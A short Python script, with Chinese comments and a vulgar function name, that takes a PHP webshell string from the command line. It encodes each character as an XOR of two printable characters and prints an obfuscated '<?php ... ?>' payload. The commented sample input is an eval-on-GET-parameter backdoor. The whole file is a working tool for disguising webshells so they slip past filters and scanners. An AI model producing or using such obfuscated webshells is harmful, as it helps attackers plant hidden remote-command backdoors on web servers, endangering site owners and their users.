import random
import sys
def getDictKey(myDict, value):
    keyList = []
    for k, v in myDict.items():
        if v == value:
            keyList.append(k)
    return keyList
def fuckdog(webshell):
    #webshell = '@eval($_GET["cmd"])'
    dict_flag = {}
    flagcode=''
    i: str
    for i in webshell:
        for j in range(32, 128):
            if j != 92 and j !=39:#92是\会导致转义，39是单引号出现'''，导致报错
                for k in range(32, 128):
                    if k != 92 and k !=39:
                        code = chr(j ^ k)
                        if code == i:
                            flagcode_var: str = "(" + "'" + chr(j) + "'" + "^" + "'" + chr(k) + "'" + ")"
                            flagcode_var = flagcode_var
                            dict_flag[flagcode_var] = i
    for key_word in webshell:
        key_list=getDictKey(dict_flag,key_word)
        numbers=random.randint(0,len(key_list))
        want_key=key_list[numbers-1]
        print("随机选取以下字符："+want_key)
        flagcode=flagcode+want_key+"."
    flagcode=flagcode[:len(flagcode)-1]
    final_key_word="<?php "+flagcode+";?>"
    print(final_key_word)
if __name__ == '__main__':
    webshell=sys.argv[1]
    fuckdog(webshell)
